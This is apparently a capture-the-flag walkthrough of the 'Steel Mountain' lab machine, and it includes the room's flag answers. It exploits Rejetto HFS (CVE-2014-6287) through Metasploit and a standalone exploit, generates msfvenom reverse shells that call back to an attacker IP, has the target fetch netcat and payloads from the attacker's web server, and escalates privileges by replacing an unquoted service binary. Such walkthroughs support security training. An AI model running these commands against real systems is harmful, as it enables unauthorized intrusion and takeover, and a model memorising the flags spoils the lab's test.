```
Steel Mountain
```

```
IP Address: 10.10.253.201, 10.10.230.176
```

```
Task #1 : Introduction
```
Deploy the machine.

1. Who is the employee of the month? => Bill Harper // As soon as we load the web-page there is an image opening the image in different tab shows file name to be BillHarper.png

```
Task #2 : Initial Access
```
Now you have deployed the machine, lets get an initial shell!

1. Scan the machine with nmap. What is the other port running a web server on? => 8080 //nmap -sC -sT 10.10.253.201 -oN nmap/initial.txt
2. Take a look at the other web server. What file server is running? => Rejetto Http File Server // Open the port 8080 and notice the file server link.
3. What is the CVE number to exploit this file server? => 2014-6287 // Quick googling of HFS 2.3 leads to CVE
4. Use Metasploit to get an initial shell. What is the user flag? => 04763b6fcf51fcd7c13abc7db4fd365
	1. msfconsole
	2. search cve-2014-6287
	3. use windows/http/rejetto_hfs_exec
	4. set RHOSTS $IP
	5. set RPORT 8080
	6. set SRVHOST local ip
	7. Show payloads
	9. set payload windows/meterpreter/reverse_tcp
	10. We have a shell
	11. once meterpreter shell is up > search -f user.txt
	12. cd C:\Users\bill\Desktop // cat user.txt 

```
Task #3 : Privilege Esclation
```
Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!


1. To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

	1. wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
	2. mv file to /opt/Powersploit/Privesc
	3. chmod 600 PowerUp.ps1
	4. now from meterpreter session upload the file.
	5. now load powershell in meterpreter
	6. now enter powershell_shell this will load run the powershell in meterpreter session
	7. run the uploaded file . .\Powerup.ps1
	8. now run the command Invoke-AllChecks to perform PrivEsc
2. Take close attention to the CanRestart option that is set to true. What is the name of the unquoted service path service name? => AdvancedSystemCareService9
	1. Check the list displayed after Invoke-AllChecks command
	2. One of the service name AdvancedSystemCareService9 has canRestart premission set to True.
3. The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
Use msfvenom to generate a reverse shell as an Windows executable.
	1. msfvenom -p windows/shell_reverse_tcp LHOST=10.8.20.244 LPORT=4449 -e x86/shikata_ga_nai -f exe -o ASCService.exe
	2. upload the file using upload module in meterpreter
	3. in meterpreter type shell and press enter
	4. run the command to stop the AdvancedSystemCareService9 service //sc stop AdvancedSystemCareService9
	5. COPY ASCService.exe to C:\Program Files (x86)\IObit\Advanced SystemCare
4. 	What is the root flag? => f314f57607c00fd09803a587db80
	1. sc start AdvancedSystemCareService9
	2. crt c
	3. background the meterpreter session
	4. sessions command will show you the new session created
	5. sessions -i 5 and enter
	6. cd C://Administrator/Desktop
	7. read root.txt using type command

```
Task #4 Access and Escalation Without Metasploit
```
Now let's complete the room without the use of Metasploit.
For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to

1. To begin we shall be using the same CVE. However, this time let's use this exploit.
*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*
To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from GitHub!
You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!
	1. Download the exploit from https://www.exploit-db.com/exploits/39161 or use searchsploit
	2. Download the netcat binary from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe and rename it to nc.exe
	3. Now open the exploit file in text editor and change the local IP address to the one you are working on and port of your choice.
	4. Now in termail run nc -lvnp on port you entered in the exploit file
	5. Run a pythom -m SimpleHTTPServer 80 from the directory you have nc.exe in
	6. now run the exploit using python exploit.py <target_ip> <port>
	7. Notice the python web server getting populated and the netcat binary is uploaded successfully to the target server
	8. Now re run the exploit and notice you have a shell.
2. Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c.
Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running. 
What powershell -c command could we run to manually find out the service name?
*Format is "powershell -c "command here"* => Get-Service
	1. In the shell run powershell -c Get-Service
	2. to upload winPEAS to toarget download the winPEAS.exe file and place it in same directory where pytom server is running
	3. Now from target shell execute powershell -c wget "http://10.8.20.244:80/winPEASx86.exe" -outfile "winPEASx64.exe"
	4. winPEAS is uploaded successfully
3. Now let's escalate to Administrator with our new found knowledge.
Generate your payload using msfvenom and pull it to the system using powershell.
Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.
First we need to stop the service which we can do like so;
sc stop AdvancedSystemCareService9
Shortly followed by;
sc start AdvancedSystemCareService9
Once this command runs, you will see you gain a shell as Administrator on our listener!
	1. Just like earlier create a payload using msfvenom and name it ASCService.exe
	2. Copy the payload in the dirctory used as python HTTPServer
	3. Now stop the AdvancedSystemCareService9 using sc stop AdvancedSystemCareService9
	4. Upload the ASCService.exe in the same directory where normal ASCService.exe is placed
	5. use the command to do so powershell -c wget "http://10.8.20.244:80/ASCService.exe" -outfile "ASCService.exe"
	6. In a terminal run nc -lvnp <given_port> and press enter
	7. Now run sc start AdvancedSystemCareService9
	8. Check the new netcat connection and notice you a root shell.
